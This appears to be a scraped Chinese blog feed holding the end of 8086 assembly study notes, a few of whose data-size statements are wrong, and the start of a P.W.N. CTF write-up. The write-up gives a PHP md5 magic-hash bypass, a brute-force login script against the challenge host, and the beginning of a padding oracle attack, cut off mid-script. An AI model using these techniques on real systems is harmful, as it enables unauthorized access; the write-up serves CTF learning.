title="9.debug"></a>9.debug</h3><p><strong>功能</strong>:</p><ol><li>可以查看CPU寄存器的各种内容</li><li>可以查看内存的使用情况</li><li>可以在机器码级别跟踪程序的运行</li></ol><p><strong>常用操作</strong>:<br><a href="https://i.loli.net/2018/11/08/5be44eaf49624.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/08/5be44eaf49624.png" alt="屏幕快照 2018-11-08 下午10.56.20.png"></a></p><h2 id="二、程序"><a href="#二、程序" class="headerlink" title="二、程序"></a>二、程序</h2><h3 id="0-程序运行"><a href="#0-程序运行" class="headerlink" title="0.程序运行"></a>0.程序运行</h3><p>1.程序加载到内存</p><p>2.CPU使用寄存器CS:IP找到程序即将执行指令的位置</p><h3 id="1-伪指令"><a href="#1-伪指令" class="headerlink" title="1.伪指令"></a>1.伪指令</h3><p>伪指令不对应机器码，由编译器进行处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">// 将名字为codesg(标号   )的代码段跟cs寄存器联系起来</div><div class="line">assume cs:codesg</div><div class="line"></div><div class="line">// XXX segment 到 XXX ends标识了一个代码段</div><div class="line"></div><div class="line">codesg segment</div><div class="line"></div><div class="line">    mov ax,0123H</div><div class="line">    ...</div><div class="line">    // 下面这两段实现了程序返回</div><div class="line">    mov ax,4c00H</div><div class="line">    int 21H</div><div class="line">    </div><div class="line">codesg ends</div><div class="line"></div><div class="line">end // 汇编程序结束的标志</div></pre></td></tr></table></figure><p>将代码保存为asm格式的文件后就可以采用微软的masm汇编编译器来编译汇编代码。(注意编译后生成的是filename.obj还需要将其链接为可执行文件filename.exe，连接可以使用微软的Overlay Linker3.60连接器)</p><h6 id="2-bx-和loop指令"><a href="#2-bx-和loop指令" class="headerlink" title="2.[bx]和loop指令"></a>2.[bx]和loop指令</h6><p><code>mov ax,[bx]</code><br>功能:bx中存放的数据作为一个偏移地址EA,段地址SA默认在ds中，将SE:EA处的数据送入ax中，即(ax)=((ds)*16+(dx))</p><p><code>inc bx</code> 是指bx中的内容加1</p><p>PS:用’()’来表示一个寄存器或者内存单元中的内容。比如(ax)就表示寄存器ax中的内容</p><p>loop指令实现循环公布功能,cx中保存了循环次数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">assume cs:codesg</div><div class="line"></div><div class="line">codesg segment</div><div class="line"></div><div class="line">    mov ax,0123H</div><div class="line">    mov cx,11</div><div class="line">    // s是一个标号</div><div class="line">    // 只要cx中的值不为0，则loop都回去执行标号s出的值</div><div class="line">s:  add ax,ax</div><div class="line">    loop s</div><div class="line">    mov ax,4c00H</div><div class="line">    int 21H</div><div class="line">    </div><div class="line">codesg ends</div><div class="line"></div><div class="line">end</div></pre></td></tr></table></figure><h6 id="3-dw和end"><a href="#3-dw和end" class="headerlink" title="3.dw和end"></a>3.dw和end</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">assume cs:codesg</div><div class="line"></div><div class="line">codesg segment</div><div class="line"></div><div class="line">        dw 0123h,0456h,0789h,0defh</div><div class="line">start:  mov ax,0123H</div><div class="line">        mov cx,11</div><div class="line">        // s是一个标号</div><div class="line">        // 只要cx中的值不为0，则loop都回去执行标号s出的值</div><div class="line">s:      add ax,ax</div><div class="line">        loop s</div><div class="line">        mov ax,4c00H</div><div class="line">        int 21H</div><div class="line">    </div><div class="line">codesg ends</div><div class="line"></div><div class="line">end start</div></pre></td></tr></table></figure><p><code>dw</code>定义了多个字符型数据，每个数据占用16个字节的内存空间。取用时从cs去的段地址，<code>dw</code>最先定义所以段偏移为0，之后bx加2操作进行连续取用。</p><p><code>end</code>除了通知编译器程序结束外，还可以告诉编译器程序的入口在什么地方。</p><h2 id="三、更灵活的定位内存地址的方法"><a href="#三、更灵活的定位内存地址的方法" class="headerlink" title="三、更灵活的定位内存地址的方法"></a>三、更灵活的定位内存地址的方法</h2><h3 id="0-七种寻址方式"><a href="#0-七种寻址方式" class="headerlink" title="0.七种寻址方式"></a>0.七种寻址方式</h3><p>寻址方式: 指令中指明操作数存放位置的表达方式。</p><p>寻址方式可以分为:</p><pre><code>立即数寻址方式(存放在指令当中)mov AL,10H--&gt;立即数(只能是源操作数，即寄存器或者存储器)寄存器寻址方式(存于寄存器中)inc cx;加1dec cs;减1mov ax,bx存储器寻址方式(存放于存储器之中)||    mov ax,[25000H]--&gt;存储器操作数||-&gt;  直接寻址方式||-&gt;  寄存器间接寻址方式||-&gt;  寄存器相对寻址方式||-&gt;  基址加变址寻址方式||-&gt;  相对加基址变址寻址方式</code></pre><p><a href="https://i.loli.net/2018/11/11/5be7ef97a7d74.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/11/5be7ef97a7d74.png" alt="屏幕快照 2018-11-11 下午4.59.54.png"></a></p><h3 id="1-and和or指令"><a href="#1-and和or指令" class="headerlink" title="1.and和or指令"></a>1.and和or指令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">;可以将操作对象的相应位设为0，其它位保持不变</div><div class="line">and a1,11111110B</div><div class="line"></div><div class="line">;可以将操作对象的相应位设为1，其它位保持不变</div><div class="line">or a1,00000001B</div></pre></td></tr></table></figure><h3 id="2-ASCII"><a href="#2-ASCII" class="headerlink" title="2.ASCII"></a>2.ASCII</h3><p>a字符–&gt;61H存储在指定空间中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">;使用&apos;......&apos;指明数据是以字符的形式给出的</div><div class="line"></div><div class="line">data segment</div><div class="line">    db &apos;unIX&apos;</div><div class="line">data ends</div><div class="line"></div><div class="line">;注意:小写字母的ASCII码值比大写字母的ASCII码值大20H</div></pre></td></tr></table></figure></p><h3 id="3-指令处理数据的长度"><a href="#3-指令处理数据的长度" class="headerlink" title="3.指令处理数据的长度"></a>3.指令处理数据的长度</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">;一个字单元</div><div class="line">mov word ptr ds:[0],1</div><div class="line">;一个字节单元</div><div class="line">mov byte ptr ds:[0],1</div></pre></td></tr></table></figure><h3 id="4-伪指令dd"><a href="#4-伪指令dd" class="headerlink" title="4.伪指令dd"></a>4.伪指令dd</h3><p>dd-&gt;字节型数据<br>dw-&gt;字型数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">data segment</div><div class="line">;数据为01H，在data:0处，占1个字节</div><div class="line">    db 1</div><div class="line">;数据为0001H，在data:1处，占1个字</div><div class="line">    dw 1</div><div class="line">;数据为00000001H，在data:2处，占2个字节</div><div class="line">    dd 1</div><div class="line">data ends</div></pre></td></tr></table></figure><h3 id="5-dup"><a href="#5-dup" class="headerlink" title="5.dup"></a>5.dup</h3><p>dup配合db,dw,dd进行数据重复</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">;db 重复的次数 dup (重复的字节型数据)</div><div class="line">db 3 dup (0,1,2)</div><div class="line">;定义了9个字节</div><div class="line">;相当于db 0,1,2,0,1,2,0,1,2</div></pre></td></tr></table></figure><h2 id="四、转移指令的原理"><a href="#四、转移指令的原理" class="headerlink" title="四、转移指令的原理"></a>四、转移指令的原理</h2><p>可以修改IP，或同时修改CS和IP的指令统称为转移指令。</p><h3 id="1-操作符-offset"><a href="#1-操作符-offset" class="headerlink" title="1.操作符 offset"></a>1.操作符 offset</h3><p><code>offset</code> 可以取得标号的偏移地址</p><h3 id="2-jmp指令"><a href="#2-jmp指令" class="headerlink" title="2.jmp指令"></a>2.jmp指令</h3><p><code>jmp</code>为无条件转移指令，可以只修改IP，也可以同时修改CS和IP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">;转到标号处执行命令,这个是</div><div class="line">jmp short 标号</div><div class="line">;段间转移</div><div class="line">jmp far ptr 标号</div></pre></td></tr></table></figure><h3 id="3-jcxz指令"><a href="#3-jcxz指令" class="headerlink" title="3.jcxz指令"></a>3.jcxz指令</h3><p><code>jcxz</code>条件转移指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">jcxz 标号</div></pre></td></tr></table></figure><h3 id="4-loop指令"><a href="#4-loop指令" class="headerlink" title="4.loop指令"></a>4.loop指令</h3><p>loop指令为循环指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">loop 标号</div></pre></td></tr></table></figure><h3 id="5-in指令"><a href="#5-in指令" class="headerlink" title="5.in指令"></a>5.in指令</h3><p>用于CPU从外设端口接收数据</p><h3 id="6-out输出指令"><a href="#6-out输出指令" class="headerlink" title="6.out输出指令"></a>6.out输出指令</h3><p>用于CPU向外设端口发送数据</p><h3 id="7-xchg交换指令"><a href="#7-xchg交换指令" class="headerlink" title="7.xchg交换指令"></a>7.xchg交换指令</h3><h3 id="8-地址传送指令-LEA-amp-LDS-amp-LES"><a href="#8-地址传送指令-LEA-amp-LDS-amp-LES" class="headerlink" title="8.地址传送指令:LEA &amp; LDS &amp; LES"></a>8.地址传送指令:LEA &amp; LDS &amp; LES</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">;reg16--16位通用寄存器</div><div class="line">;mem--存储单元</div><div class="line">LEA reg16,mem</div></pre></td></tr></table></figure><h3 id="9-标志传送指令-LAHF-amp-SAHF-amp-PUSHF-amp-POPF"><a href="#9-标志传送指令-LAHF-amp-SAHF-amp-PUSHF-amp-POPF" class="headerlink" title="9.标志传送指令:LAHF &amp; SAHF &amp; PUSHF &amp; POPF"></a>9.标志传送指令:LAHF &amp; SAHF &amp; PUSHF &amp; POPF</h3><h2 id="五、算数运算指令的原理"><a href="#五、算数运算指令的原理" class="headerlink" title="五、算数运算指令的原理"></a>五、算数运算指令的原理</h2><h3 id="1-加法指令"><a href="#1-加法指令" class="headerlink" title="1.加法指令"></a>1.加法指令</h3><p>• ADD(Addition) 加法指令</p><p>• ADC(Add withCarry)带进位加法指令</p><p>• INC(Increment)加 1指令</p><p>• AAA(ASCIIadjustforaddition)加法ASCII调整指令</p><p>• DAA(Decimaladjustforaddition)加法十进制调整指令</p><h3 id="2-减法指令"><a href="#2-减法指令" class="headerlink" title="2.减法指令"></a>2.减法指令</h3><p>8086有7条减法指令:</p><p>• SUB(Subtraction)减法指令</p><p>• SBB(SubtractionwithBorrow)进位减法指令</p><p>• DEC(Decrement by 1)减1指令</p><p>• NEG(Negate) 求补指令</p><p>• CMP(Compare)比较指令</p><p>• AAS(ASCII Adjust for Subtraction) 减法ASCII调整指令</p><p>• DAS(Decimal Adjust for Subtraction) 减法十进制调整指令</p><h3 id="3-乘法指令"><a href="#3-乘法指令" class="headerlink" title="3. 乘法指令"></a>3. 乘法指令</h3><p>1）无符号乘法（MUL）</p><p>2）带符号乘法（IMUL）</p><h3 id="4-除法指令"><a href="#4-除法指令" class="headerlink" title="4.除法指令"></a>4.除法指令</h3><p>1）无符号除法（DIV）</p><p>2）带符号除法（IDIV）</p><p>3）字节扩展指令（CBW）</p><p>4）字扩展指令（CWD） </p><h3 id="5-十进制调整指令"><a href="#5-十进制调整指令" class="headerlink" title="5.十进制调整指令"></a>5.十进制调整指令</h3><p>共六条</p><p>• AAA非压缩BCD码的加法十进制调整</p><p>• DAA压缩BCD码的加法十进制调整</p><p>• AAS非压缩BCD码的减法十进制调整</p><p>• DAS压缩BCD码的减法十进制调整</p><p>• AAM乘法的十进制调整</p><p>• AAD除法的十进制调整</p><h2 id="六、逻辑运算和移位指令"><a href="#六、逻辑运算和移位指令" class="headerlink" title="六、逻辑运算和移位指令"></a>六、逻辑运算和移位指令</h2><p>针对二进制0/1进行的操作</p><h3 id="1-逻辑运算指令"><a href="#1-逻辑运算指令" class="headerlink" title="1.逻辑运算指令"></a>1.逻辑运算指令</h3><p>• AND逻辑“与”指令(有0则0)</p><p>• TEST测试指令(只改变标志位)</p><p>• OR逻辑“或”指令(有1则1)</p><p>• XOR（exclusive OR)逻辑“异或”指令(相同为0，不同为1)</p><p>• NOT逻辑“非”指令(不能是立即数)</p><h3 id="2-移位指令"><a href="#2-移位指令" class="headerlink" title="2.移位指令"></a>2.移位指令</h3><p>• SAL (Shift Arithmetic Left)算术左移(无符号数乘2，最高位进CL)</p><p>• SAR (Shiftarithmeticright)算术右移(无符号数除2，最低位进CF)</p><p>• SHL (Shift logical left)逻辑左移(最低位不变，)</p><p>• SHR (Shiftlogicalright)逻辑右移(最高位不变，低位移入CF)</p><p>• ROL (Rotateleft)循环左移</p><p>• ROR (Rotateright)循环右移</p><p>• RCL (Rotateleftwith carry)带进位循环左移(就是循环时是带CF的)</p><p>• RCR (Rotateright withcarry)带进位循环右移</p><h2 id="七、串操作类指令"><a href="#七、串操作类指令" class="headerlink" title="七、串操作类指令"></a>七、串操作类指令</h2><p>• “串”就是内存中一段地址相连的<strong>字节B或字W</strong>；</p><p>• 串操作，也叫数据块操作；</p><p>• 可实现存储器数据间的直接传送；</p><p>• 8086有5种基本串操作：</p><p>MOVS（Move string）串传送指令</p><p>CMPS（Compare string）串比较指令</p><p>SCAS（Scan string）串扫描指令</p><p>LODS（Load from string）取串指令</p><p>STOS （Store in to string）存串指令</p><h3 id="1-标志处理指令"><a href="#1-标志处理指令" class="headerlink" title="1.标志处理指令"></a>1.标志处理指令</h3><p>• CLC （Clearcarryflag)清C标志</p><p>• STC（Setcarryflag )置C标志</p><p>• CMC（Complementcarryflag）对C求反</p><p>• CLD（Cleardirectionflag)清D标志</p><p>• STD（Setdirectionflag)置D标志</p><p>• CLI（Clearinterruptflag)清I标志</p><p>• STI （Setinterruptenableflag)置I标志</p><h3 id="2-其他处理机控制指令"><a href="#2-其他处理机控制指令" class="headerlink" title="2.其他处理机控制指令"></a>2.其他处理机控制指令</h3><p>• NOP（Nooperation)空操作</p><p>• HLT（Halt) CPU暂停状态</p><p>• WAITCPU等待状态</p><p>• ESC交权</p><p>• LOCK（Lockbus)总线锁定</p><h2 id="八、opcode"><a href="#八、opcode" class="headerlink" title="八、opcode"></a>八、opcode</h2><p>操作码(Operation Code, OPCode) 描述机器语言指令中，指定要执行某种操作的机器码。</p><p>OPCode在不同的场合中通常具有不同的含义，例如PHP虚拟机(Zend VM)、java虚拟机(JVM)</p><p>以及一些软件保护虚拟机中的最小操作单元都可以称之为OPCode。</p><h2 id="九、参考"><a href="#九、参考" class="headerlink" title="九、参考"></a>九、参考</h2><p><a href="https://www.kanxue.com/book-31.htm" target="_blank" rel="external">https://www.kanxue.com/book-31.htm</a></p><p>《汇编语言(第3版)》王爽著</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>P.W.N. CTF Writeup</title>
      <link href="/2018/11/02/P-W-N-CTF-note/"/>
      <url>/2018/11/02/P-W-N-CTF-note/</url>
      <content type="html"><![CDATA[<h1 id="Login-Sec"><a href="#Login-Sec" class="headerlink" title="Login Sec"></a>Login Sec</h1><p><strong>Login 1</strong>的代码如下:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</div><div class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</div><div class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> _0x86d1=[<span class="string">"\x68\x65\x78"</span>,<span class="string">"\x72\x61\x6E\x64\x6F\x6D\x42\x79\x74\x65\x73"</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePart1</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span></div><div class="line">         &#123;</div><div class="line">             <span class="attr">x</span>: crypto[_0x86d1[<span class="number">1</span>]](<span class="number">8</span>)</div><div class="line"></div><div class="line">         &#125;[x].toString(_0x86d1[<span class="number">0</span>]);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePart2</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> [+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]];</div><div class="line">&#125;</div><div class="line"></div><div class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">    res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/html'</span>&#125;);</div><div class="line">    passwd = generatePart1() + generatePart2();</div><div class="line">    <span class="keyword">var</span> url_content = url.parse(req.url, <span class="literal">true</span>);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (passwd == url_content.query.passwd) &#123;</div><div class="line">       res.write(fs.readFileSync(<span class="string">'flag.txt'</span>, <span class="string">'utf8'</span>));</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        res.write(<span class="string">'&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;'</span>);</div><div class="line">    &#125;</div><div class="line">    res.end();</div><div class="line">&#125;).listen(<span class="number">8888</span>);</div></pre></td></tr></table></figure><p>我在此将其简化一下，方便本地运行。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> _0x86d1=[<span class="string">"\x68\x65\x78"</span>,<span class="string">"\x72\x61\x6E\x64\x6F\x6D\x42\x79\x74\x65\x73"</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePart1</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span></div><div class="line">                 &#123;</div><div class="line">                         <span class="attr">x</span>: crypto[_0x86d1[<span class="number">1</span>]](<span class="number">8</span>)</div><div class="line"></div><div class="line">                 &#125;[x].toString(_0x86d1[<span class="number">0</span>]);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePart2</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> [+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]];</div><div class="line">&#125;</div><div class="line"></div><div class="line">    passwd = generatePart1() + generatePart2();</div><div class="line">    <span class="built_in">console</span>.log(passwd)</div></pre></td></tr></table></figure><p>运行结果为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> zeroyu@zeros  ~/Desktop  node login.js</div><div class="line">undefined1337</div></pre></td></tr></table></figure><p>提交<code>undefined1337</code>得到flag的第一部分<code>flag{W0w_1_gu3ss_th1s</code></p><p><strong>Login 2</strong>的代码如下，可以看出是md5的弱类型比较，只要求md5之后的值开头是0e即可，提交<code>s878926199a</code>得到下一部分的flag<code>_t0_be_4_pr3tty_</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'passwd'</span>])) &#123;</div><div class="line">        <span class="keyword">if</span> (hash(<span class="string">"md5"</span>, $_GET[<span class="string">'passwd'</span>]) == <span class="string">'0e514198428367523082236389979035'</span>)        &#123;</div><div class="line">                <span class="keyword">echo</span> $flag;</div><div class="line">        &#125; </div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;'</span>;</div><div class="line">&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>Login 3</strong>部分代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_from_directory</div><div class="line"></div><div class="line">app = Flask(__name__)</div><div class="line"></div><div class="line">passwd = open(<span class="string">"/opt/passwd.txt"</span>).read()</div><div class="line">flag = open(<span class="string">"/opt/flag.txt"</span>).read()</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">    userpw = request.args.get(<span class="string">"passwd"</span>, <span class="string">""</span>)</div><div class="line">    <span class="keyword">if</span> userpw == passwd:</div><div class="line">        <span class="keyword">return</span> flag, <span class="number">200</span>, &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/plain"</span>&#125;</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">'&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">assert</span>(len(passwd) == <span class="number">3</span>)</div><div class="line">    <span class="keyword">assert</span>(passwd.isdigit())</div><div class="line">    app.run()</div></pre></td></tr></table></figure><p>关键在于一下两行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">assert(len(passwd) == 3)</div><div class="line">assert(passwd.isdigit())</div></pre></td></tr></table></figure><p>这两行判断了从<code>/opt/passwd.txt</code>中读出的内容的长度是否是3，类型是否是数字。一般我们可能会字节考虑<code>100-999</code>,但是要知道<code>000、009</code>这些长度也是3，也是数字类型。所以写爆破脚本如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">1000</span>):</div><div class="line">        url = <span class="string">"http://login3.uni.hctf.fun/?passwd=%03d"</span> % i</div><div class="line">        r = requests.get(url).content</div><div class="line">        s = <span class="string">"""&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;"""</span></div><div class="line">        <span class="keyword">if</span>(s != r.decode(<span class="string">'utf-8'</span>)):</div><div class="line">                print(i)</div><div class="line">                <span class="keyword">break</span></div></pre></td></tr></table></figure><p>最终爆破得到结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> zeroyu@zeros  ~/Desktop  python testlogin.py</div><div class="line">7</div></pre></td></tr></table></figure><p>提交<code>007</code>得到最后一部分flag <code>4_d4mn_l0ng_fl4g}</code></p><h1 id="Converter"><a href="#Converter" class="headerlink" title="Converter"></a>Converter</h1><p>target:<code>http://converter.uni.hctf.fun/</code></p><p>分析之后，可以看到vals的长度是16的倍数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">content=test</div><div class="line"></div><div class="line">vals=abe356a36f821925d21c83ed298f35136ba2089bcd4961c4af60426f0e392113a74bc8e5dbcc77aa244833318636d73a0e1c9a6072e40b115743d5f0dbbbc7b9</div><div class="line"></div><div class="line">128个字符</div><div class="line"></div><div class="line">content=testtest</div><div class="line"></div><div class="line">vals=3594a122720368f402eca150c2d85b82634027d10b41145c06a4396987ff1f4b53d9cfc2d3bd4a3f5a73b4c00bfe158e928d52d868a32ff949a456ab2834fe696435316fd2227396112b0d65fb104961</div><div class="line"></div><div class="line">160个字符</div><div class="line"></div><div class="line">content=testtestte</div><div class="line"></div><div class="line">vals=ea63f05d45c98e48208261d6e2d2a5d336d657d0ca1b5ca41bf0c8bade5f2db59724e76bdfca4bdefaae182cd1246451d9d2f0b79c867eecd90c1c0fd12f65ff74d174b9ff0f6f97bbfc8c3be536f265</div><div class="line"></div><div class="line">160个字符</div></pre></td></tr></table></figure></p><p>比如以下这组数据:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">content=t</div><div class="line"></div><div class="line">vals=a7cef9264688e0abc6717d25c3682ff2452e6ab9d98f6d0f7203b5fb2512d4982189f0f4a0748005a19d93166c15f12855ccbeba2bd7fb8c9283c969df631551</div></pre></td></tr></table></figure><p>我们修改vals的第一位后发送请求，得到一个错误<code>JSONDecodeError: Expecting value: line 1 column 1 (char 0)</code>，修改最后一位发送请求，得到一个<code>ValueError: Invalid padding bytes.</code>。由以上两点可以看出，cookie中包含<code>AES-CBC-encrypted JSON</code>数据。所以在这种分组加密中我们可以联想到Padding Oracle攻击，关于这种攻击可以参考:</p><p><a href="https://www.jianshu.com/p/ad8bdd87e131" target="_blank" rel="external">《Web狗要懂的Padding Oracle攻击》</a></p><p><a href="https://err0rzz.github.io/2017/11/23/Padding-Oracle-%E6%94%BB%E5%87%BB/" target="_blank" rel="external">《Padding_Oracle 攻击》</a></p><p>接下来我们使用脚本将cookie值进行解密:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div 